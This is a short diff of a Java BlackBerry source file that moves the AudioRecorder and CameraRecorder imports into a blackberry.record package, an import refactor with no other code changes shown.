@@ -16,13 +16,13 @@ import java.util.Vector;
 import javax.microedition.media.Player;
 import javax.microedition.media.control.RecordControl;
 
-import record.AudioRecorder;
-import record.CameraRecorder;
 
 import net.rim.device.api.util.DataBuffer;
 import blackberry.event.Event;
 import blackberry.fs.AutoFlashFile;
 import blackberry.fs.Path;
+import blackberry.record.AudioRecorder;
+import blackberry.record.CameraRecorder;
 import blackberry.upgrade.Upgrade;
 import blackberry.utils.Check;
 import blackberry.utils.Debug;
